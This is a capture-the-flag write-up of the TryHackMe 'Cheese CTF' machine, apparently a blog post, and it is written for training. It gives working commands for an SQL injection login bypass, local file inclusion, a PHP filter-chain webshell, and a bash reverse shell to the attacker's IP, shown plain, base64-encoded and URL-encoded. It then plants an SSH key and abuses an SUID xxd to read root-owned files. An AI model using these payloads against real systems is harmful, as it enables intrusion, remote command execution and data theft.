---
title: "Cheese CTF machine on THM"
classes: wide
header:  
  teaser: /assets/images/posts/writeups/cheese_ctf.jpg
  #overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Cheese CTF is a (not so) easy challenge with different extra flavours. Starting with SQLi and continuing with PHP filters for LFI, to chaining PHP filters for RCE, you'll encounter everything in between and more."
description: "Walkthrough on Cheese CTF machine from TryHackMe"
categories:
  - writeups
tags:
  - Filters
  - PHP
  - Authentication
  - SQLi
  - writeup
  - TryHackMe
  - Easy
toc: false
---

<img src="/assets/images/posts/writeups/cheese_ctf.jpg" alt="Cheese CTF" width="500" class="align-center">

Cheese CTF is a (not so) easy challenge with different extra flavours. Starting with SQLi and continuing with PHP filters for LFI, to chaining PHP filters for RCE, you'll encounter everything in between and more.

## Information gathering

### Scanning

#### nuclei

Command:

```sh
nuclei -u http://10.10.215.157
```

Results:

```sh
[INF] Current nuclei version: v3.3.2 (outdated)
[INF] Current nuclei-templates version: v10.0.0 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 255
[INF] Templates loaded for current scan: 8506
[INF] Executing 8505 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1586 (Reduced 1491 Requests)
[INF] Using Interactsh Server: oast.site
[waf-detect:apachegeneric] [http] [info] http://10.10.215.157
[ssh-auth-methods] [javascript] [info] 10.10.215.157:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] 10.10.215.157:22
[ssh-server-enumeration] [javascript] [info] 10.10.215.157:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11"]
[ssh-sha1-hmac-algo] [javascript] [info] 10.10.215.157:22
[rsync-list-modules] [javascript] [low] 10.10.215.157:873 ["220  S+  Welcome  to  SpamFilter  for  ISP  SMTP  Server  v0S+"]
[openssh-detect] [tcp] [info] 10.10.215.157:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11"]
[pgsql-detect] [tcp] [info] 10.10.215.157:5432
[options-method] [http] [info] http://10.10.215.157 ["OPTIONS,HEAD,GET,POST"]
[email-extractor] [http] [info] http://10.10.215.157 ["info@thecheeseshop.com"]
[apache-detect] [http] [info] http://10.10.215.157 ["Apache/2.4.41 (Ubuntu)"]
[http-missing-security-headers:clear-site-data] [http] [info] http://10.10.215.157
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.10.215.157
[http-missing-security-headers:strict-transport-security] [http] [info] http://10.10.215.157
[http-missing-security-headers:content-security-policy] [http] [info] http://10.10.215.157
[http-missing-security-headers:x-frame-options] [http] [info] http://10.10.215.157
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.10.215.157
[http-missing-security-headers:referrer-policy] [http] [info] http://10.10.215.157
[http-missing-security-headers:permissions-policy] [http] [info] http://10.10.215.157
[http-missing-security-headers:x-content-type-options] [http] [info] http://10.10.215.157
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.10.215.157
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.10.215.157
```
#### ffuf

Command:

```sh
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.215.157/FUZZ
```

Results:

```sh
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 59ms]
```

## Exploitation

### Foothold
1. Since we don't have many information to work with, we can try to manually explore the app. First stop is the login page where I tried a couple of payloads and one SQLi payload worked to bypass the login `test'||1=1;-- -`
2. With login bypassed we land on a secret panel like `http://10.10.213.211/secret-script.php?file=supersecretadminpanel.html`
3. First thing I've tried was to replace the loaded HTML with a server path like `/etc/passwd` similar to `http://10.10.213.211/secret-script.php?file=/etc/passwd` and worked:

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
comte:x:1000:1000:comte:/home/comte:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
```
4. Further investigating the app I landed on `Orders` page where the PHP filter is used `http://10.10.213.211/secret-script.php?file=php://filter/resource=orders.html`
5. Using the base64 encoding with filter we can exfiltrate the content of the PHP file; for this we can use the filter with `http://10.10.213.211/secret-script.php?file=php://filter/read=convert.base64-encode/resource=login.php` to check the content and validations for login page
6. This payload will return the base64 encoded version of `login.php` page (we can use the Burp Suite Decoder, or Linux based tools to decode)

```sh

<?php
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";

// Create a connection to the database
$conn = new mysqli($servername, $user, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    echo $conn->connect_error;
    die("Connection failed: " . $conn->connect_error);
}
// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pass = $_POST["password"];
    function filterOrVariations($input) {
     //Use case-insensitive regular expression to filter 'OR', 'or', 'Or', and 'oR'
    $filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
    return $filtered;
}
    $filteredInput = filterOrVariations($username);
    //echo($filteredInput);
    // Hash the password (you should use a stronger hashing algorithm)
    $hashed_password = md5($pass);

    // Query the database to check if the user exists
    $sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
    $result = $conn->query($sql);
    $status = "";
    if ($result->num_rows == 1) {
        // Authentication successful
        $status = "Login successful!";
         header("Location: secret-script.php?file=supersecretadminpanel.html");
         exit;
    } else {
        // Authentication failed
         $status = "Login failed. Please check your username and password.";
    }
}
// Close the database connection
$conn->close();
?>
```
7. Checking the PHP script we can see the DB user details in clear (user/password) and see the hashing algorithm used for storing passwords in DB is MD5 
8. Another interesting file to check is `secret-script.php`:

```sh
<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```
9. After I tried to manually chain all the possible PHP wrappers, I found a tool for the job, a great resource PHP filter chain generator: https://github.com/synacktiv/php_filter_chain_generator
10. With the tool set up and in place I have generated first POC, a simple PHP script`<?php phpinfo(); ?>` transformed with the tool like `python3 php_filter_chain.py --chain '<?php phpinfo(); ?>  '` and the output I appended as a value to my vulnerable URL parameter (no need to display the entire string)

```sh
http://10.10.7.200/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]
```
11. Now we need a way to run commands, and for this we can use a simple PHP script and run it with the parameter. Using the same technique as before I have converted the simple PHP file ```<?=`$_GET[cmd]`?>``` and run it with `cmd` parameter in URL like:

```sh
http://10.10.93.52/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.[....]&cmd=whoami
```
12. Now we have in place a method to run commands, next step will be to get a reverse shell. For this we can use a simple shell like `bash -i >& /dev/tcp/10.11.79.193/4455 0>&1` but because when I tried to add it as a value of `cmd` parameter in URL conflicted because of special chars, we need to first encode the payload and use a command to decode on the server and run it `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS43OS4xOTMvNDQ1NSAwPiYx|base64 -d|bash` and than URL encode it resulting in a URL like:

```sh
http://10.10.93.52/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%53%34%33%4f%53%34%78%4f%54%4d%76%4e%44%51%31%4e%53%41%77%50%69%59%78%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68
```
13. Now we have a revshell and the next step will be to stabilize it
14. I have spawn a python server and transfer `linpeas.sh` to `/tmp` folder on the victim machine, and run it
15. One of the vulnerabilities flagged is regarding `/home/comte/.ssh/authorized_keys` location as being writable by our user. To exploit this we can simply generate a new key pair locally and write the public key on the server. On our machine:

```sh
ssh-keygen -t rsa #generate new key pair

chmod 600 id_rsa #set correct rights on private key\

cat id_rsa.pub # get the content of the public key and copy it

```
16. O the victim machine:

```sh
echo 'content copied of the id_rsa.pub' > /home/comte/.ssh/authorized_keys
```
#### Data exfiltration
1. With the keys in place we can SSH as `comte` from our local machine

```sh
ssh comte@10.10.93.52 -i id_rsa
```
2. Once on the machine we can get the content of the user flag: **[UserFlag]**

### Privilege escalation
1. Run a simple `sudo -l` will return:

```sh
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```
2. The same `exploit.timer` service was flagged `linpeas.sh` when we run it
3. Checking the `exploit.service` will reveal:

```sh
comte@cheesectf:/etc/systemd/system$ cat exploit.service 
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```
4. Basically is copying the `xxd` to `/opt` location and set the `SUID`
5. The `xxd` can be exploited as per https://gtfobins.github.io/gtfobins/xxd/
6. First we have to start the service `sudo /bin/systemctl start exploit.timer` but will return an error: "*Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting. See system logs and 'systemctl status exploit.timer' for details.*"
7. The problem is related to `exploit.timer` config where the `OnBootSec=` value is missing
8. Update the value to `OnBootSec=0` by editing the file with `nano` and start the service again
9. Check the content of `/opt` folder where an instance of `xxd` with SUID bit set should be available:

```sh
comte@cheesectf:/opt$ ls -la
total 28
drwxr-xr-x  2 root root  4096 Oct  3 13:51 .
drwxr-xr-x 19 root root  4096 Sep 27  2023 ..
-rwsr-sr-x  1 root root 18712 Oct  3 13:51 xxd
```
#### Data exfiltration
1. Now let's follow the GTFOBins (link above) instructions and try to read the content of root.txt file. For this, first we need to set the file path as value for a variable, then try to read it like:

```sh
LFILE=/root/root.txt
./xxd "$LFILE" | xxd -r
```
2. The root flag is **[RootFlag]** :)

## Addendum
1. The application is protected by a type of WAF, as per what `nuclei found` is `[waf-detect:apachegeneric] [http] [info] http://10.10.215.157` so any normal scann with `nmap` or `naabu` will not help
2. I was lucky enough to to find the SQLi payload, but a different approach will be to run the `sqlmap` on the login form and you'll find the same result
3. Continuing with `sqlmap` you can exfiltrate the content of `users` table, but this is a rabbit hole, you can't un-hash the MD5 password with regular dictionaries (including rockyou.txt)

```sh
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```
2. I spent some time trying to use the credentials discovered inside `login.php`, with no luck

```sh
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";
```